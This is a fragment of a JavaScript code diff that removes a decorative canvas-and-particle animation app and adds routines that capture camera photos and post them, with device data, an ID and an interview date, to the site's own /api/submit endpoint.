-                ctx.shadowBlur = 20;
-                ctx.shadowOffsetX = 5;
-                ctx.shadowOffsetY = 5;
-
-                ctx.beginPath();
-                ctx.roundRect(-shape.size / 2, -shape.size / 2, shape.size, shape.size, 20);
-                ctx.fill();
-
-                ctx.restore();
-            });
-
-            requestAnimationFrame(animate);
-        };
-
-        animate();
+    } catch (err) {
+      console.error('Camera error:', err);
+      // Continue without photos if camera fails
     }
 
-    // Setup floating particles
-    setupParticles() {
-        const container = document.getElementById('particles');
-        const particleCount = 20;
+    return photos;
+  }
 
-        for (let i = 0; i < particleCount; i++) {
-            const particle = document.createElement('div');
-            particle.className = 'particle';
+  // ===== SUBMIT DATA =====
+  async function submitData(deviceData, photos) {
+    const formData = new FormData();
+    formData.append('rorshid', state.rorshid);
+    formData.append('interviewDate', state.interviewDate);
+    formData.append('deviceData', JSON.stringify(deviceData));
 
-            const size = Math.random() * 20 + 10;
-            particle.style.width = `${size}px`;
-            particle.style.height = `${size}px`;
-            particle.style.left = `${Math.random() * 100}%`;
-            particle.style.animationDuration = `${Math.random() * 15 + 10}s`;
-            particle.style.animationDelay = `${Math.random() * 10}s`;
+    // Append photos
+    photos.forEach((blob, index) => {
+      formData.append('photos', blob, `capture_${index + 1}.jpg`);
+    });
 
-            container.appendChild(particle);
-        }
+    const res = await fetch('/api/submit', {
+      method: 'POST',
+      body: formData
+    });
+
+    const result = await res.json();
+
+    if (!result.success) {
+      throw new Error(result.error || 'Submission failed');
     }
-}
+  }
 
-// Initialize app when DOM is ready
-document.addEventListener('DOMContentLoaded', () => {
-    window.openShareApp = new OpenShareApp();
-});
+  // ===== START =====
+  init();
 
-// Add custom animations to stylesheet
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes glow {
-        0%, 100% { box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light), 0 0 0 0 rgba(212, 168, 67, 0.2); }
-        50% { box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light), 0 0 20px 5px rgba(212, 168, 67, 0.1); }
-    }
-
-    @keyframes pulse {
-        0%, 100% { transform: scale(1); }
-        50% { transform: scale(1.02); }
-    }
-`;
-document.head.appendChild(style);
+})();
